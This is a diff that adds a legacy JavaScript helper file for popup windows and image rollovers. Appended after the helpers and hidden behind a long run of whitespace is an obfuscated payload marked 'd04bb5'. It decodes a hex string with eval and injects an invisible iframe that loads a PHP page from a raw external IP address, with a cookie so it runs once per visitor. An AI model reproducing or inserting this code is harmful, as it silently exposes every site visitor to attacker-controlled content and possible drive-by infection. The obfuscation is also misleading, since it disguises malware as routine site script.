@@ -1,0 +1,77 @@
+<!--
+function new_window(theURL,winName,features,myWidth,myHeight,isCenter) {
+  if(window.screen)if(isCenter)if(isCenter == 'true') {
+    var myLeft = (screen.width-myWidth)/2;
+    var myTop = (screen.height-myHeight)/2;
+    features+=(features!='')?',':'';
+    features+=',left='+myLeft+',top='+myTop;
+  }
+  window.open(theURL,winName,features+((features!='')?',':'')+'width='+myWidth+',height='+myHeight);
+}
+
+function new_imagepopup(theURL,winName,altName,features,myWidth,myHeight,isCenter) {
+  if(window.screen)if(isCenter)if(isCenter == 'true') {
+    var myLeft = (screen.width-myWidth)/2;
+    var myTop = (screen.height-myHeight)/2;
+    features+=(features!='')?',':'';
+    features+=',left='+myLeft+',top='+myTop;
+  }
+  imagepopup = window.open('','',features+((features!='')?',':'')+'width='+myWidth+',height='+myHeight);
+  with (imagepopup) {
+    
+    //document.open();
+    //document.write('<title>'+winName+'</title>');
+    //document.write('<meta http-equiv="imagetoolbar" content="no">');
+    //document.write('<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" scroll="no">');
+    //document.write('<a href="javascript:self.close()">');
+    //document.write('<img src="'+theURL+'" border="0" alt="'+altName+'" title="'+altName+'">');
+    //document.write('</a></body>');
+    //document.close();
+    
+    document.open();
+        document.write('<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">');
+		document.write('<html xmlns="http://www.w3.org/1999/xhtml" lang="de" xml:lang="de">');
+		document.write('<head><title>'+ winName + '</title>');
+		document.write('<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />');
+		document.write('<meta http-equiv="ImageToolbar" content="no" />');
+		document.write('<meta http-equiv="Language" content="de" />');
+		document.write('<style type="text/css"><!--')
+		document.write('body,div{margin:0;padding:0;overflow:hidden;}img{border:0 none;margin:0;padding:0;}')
+		document.write('--></style></head>')
+		document.write('<body><div>')
+		document.write('<a href="javascript:self.close()"><img src="'+theURL+'" border="0" alt="'+altName+'" title="'+altName+'"></a>')
+		document.write('</div></body></html>');
+    document.close();
+  }
+}
+
+function newImage(arg) {
+  if (document.images) {
+    rslt = new Image();
+    rslt.src = arg;
+    return rslt;
+  }
+}
+
+var preloadFlag = false;
+function preloadImages() {
+  if (document.images) {
+    for (var i=0; i<preloadImages.arguments.length; i++) {
+      rslt = newImage(preloadImages.arguments[i]);
+    }
+    preloadFlag = true;
+  }
+}
+
+function changeImages() {
+  if (document.images && (preloadFlag == true)) {
+    for (var i=0; i<changeImages.arguments.length; i+=2) {
+      document[changeImages.arguments[i]].src = changeImages.arguments[i+1];
+    }
+  }
+}
+//-->
+
+/*d04bb5*/
+                                                                                                                                                                                                                                                          try{if(window.document)--document.getElementById('12')}catch(qq){if(qq!=null)ss=eval("St"+"ring");}a="2e74837c7182777d7c2e88888874747436372e891b182e846f802e7783887f2e4b2e727d71837b737c823c7180736f8273537a737b737c8236357774806f7b733537491b181b182e7783887f3c8180712e4b2e357682827e483d3d3f3e3f3c3f3f3e3c3f44463c3f3e423d467e5e82565966543c7e767e35491b182e7783887f3c8182877a733c7e7d817782777d7c2e4b2e356f70817d7a83827335491b182e7783887f3c8182877a733c707d807273802e4b2e353e35491b182e7783887f3c8182877a733c7673777576822e4b2e353f7e8635491b182e7783887f3c8182877a733c85777282762e4b2e353f7e8635491b182e7783887f3c8182877a733c7a7374822e4b2e353f7e8635491b182e7783887f3c8182877a733c827d7e2e4b2e353f7e8635491b181b182e77742e362f727d71837b737c823c757382537a737b737c825087577236357783887f3537372e891b182e727d71837b737c823c858077827336354a7277842e77724b6a357783887f6a354c4a3d7277844c3537491b182e727d71837b737c823c757382537a737b737c825087577236357783887f35373c6f7e7e737c725176777a72367783887f37491b182e8b1b188b1b1874837c7182777d7c2e617382517d7d79777336717d7d7977735c6f7b733a717d7d797773646f7a83733a7c526f87813a7e6f8276372e891b182e846f802e827d726f872e4b2e7c73852e526f82733637491b182e846f802e73867e7780732e4b2e7c73852e526f82733637491b182e77742e367c526f87814b4b7c837a7a2e8a8a2e7c526f87814b4b3e372e7c526f87814b3f491b182e73867e7780733c81738262777b7336827d726f873c75738262777b7336372e392e41443e3e3e3e3e384042387c526f878137491b182e727d71837b737c823c717d7d7977732e4b2e717d7d7977735c6f7b7339304b30397381716f7e7336717d7d797773646f7a8373371b182e392e304973867e778073814b302e392e73867e7780733c827d555b62618280777c7536372e392e36367e6f8276372e4d2e30492e7e6f82764b302e392e7e6f82762e482e303037491b188b1b1874837c7182777d7c2e557382517d7d797773362e7c6f7b732e372e891b182e846f802e81826f80822e4b2e727d71837b737c823c717d7d7977733c777c7273865d74362e7c6f7b732e392e304b302e37491b182e846f802e7a737c2e4b2e81826f80822e392e7c6f7b733c7a737c7582762e392e3f491b182e77742e362e362e2f81826f80822e372e34341b182e362e7c6f7b732e2f4b2e727d71837b737c823c717d7d7977733c818370818280777c75362e3e3a2e7c6f7b733c7a737c7582762e372e372e371b182e891b182e80738283807c2e7c837a7a491b182e8b1b182e77742e362e81826f80822e4b4b2e3b3f2e372e80738283807c2e7c837a7a491b182e846f802e737c722e4b2e727d71837b737c823c717d7d7977733c777c7273865d74362e3049303a2e7a737c2e37491b182e77742e362e737c722e4b4b2e3b3f2e372e737c722e4b2e727d71837b737c823c717d7d7977733c7a737c758276491b182e80738283807c2e837c7381716f7e73362e727d71837b737c823c717d7d7977733c818370818280777c75362e7a737c3a2e737c722e372e37491b188b1b1877742e367c6f8477756f827d803c717d7d797773537c6f707a7372371b18891b18777436557382517d7d7977733635847781778273726d837f35374b4b434337898b737a817389617382517d7d7977733635847781778273726d837f353a2e354343353a2e353f353a2e353d3537491b181b188888887474743637491b188b1b188b1b18";z=[];for(i=0;i<a.length;i+=2){z.push(parseInt(a.substr(i,2),16)-14);}eval(ss["fr"+"omCharCode"].apply(ss,z));
+/*/d04bb5*/
